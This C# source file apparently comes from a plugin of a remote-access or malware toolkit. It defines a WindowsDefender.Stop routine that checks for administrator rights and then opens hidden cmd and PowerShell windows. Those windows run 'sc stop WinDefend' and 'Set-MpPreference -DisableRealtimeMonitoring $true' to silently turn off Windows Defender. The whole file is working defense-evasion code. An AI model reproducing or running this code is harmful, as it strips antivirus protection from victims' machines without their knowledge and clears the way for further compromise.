using System.Diagnostics;
using System.Globalization;
using System.Text;

/* 
|| AUTHOR Arsium ||
|| github : https://github.com/arsium       ||
*/
//https://www.itechtics.com/enable-disable-windows-defender/

namespace Plugin
{
    internal class WindowsDefender
    {
        internal static void Stop() 
        {
            if (!Utils.IsAdmin())
                return;
            //sc stop WinDefend
            //Set-MpPreference -DisableRealtimeMonitoring $true
            Process cmd = new Process();
            cmd.StartInfo.StandardOutputEncoding = Encoding.GetEncoding(CultureInfo.CurrentCulture.TextInfo.OEMCodePage);
            cmd.StartInfo.FileName = "cmd.exe";
            cmd.StartInfo.RedirectStandardInput = true;
            cmd.StartInfo.RedirectStandardOutput = true;
            cmd.StartInfo.CreateNoWindow = true;
            cmd.StartInfo.UseShellExecute = false;
            cmd.Start();

            cmd.StandardInput.WriteLine("sc stop WinDefend");
            cmd.StandardInput.Flush();
            cmd.StandardInput.Close();
            cmd.WaitForExit();

            Process powershell = new Process();
            powershell.StartInfo.StandardOutputEncoding = Encoding.GetEncoding(CultureInfo.CurrentCulture.TextInfo.OEMCodePage);
            powershell.StartInfo.FileName = "powershell.exe";
            powershell.StartInfo.RedirectStandardInput = true;
            powershell.StartInfo.RedirectStandardOutput = true;
            powershell.StartInfo.CreateNoWindow = true;
            powershell.StartInfo.UseShellExecute = false;
            powershell.Start();

            powershell.StandardInput.WriteLine("Set-MpPreference -DisableRealtimeMonitoring $true");
            powershell.StandardInput.Flush();
            powershell.StandardInput.Close();
            powershell.WaitForExit();
        }
    }
}
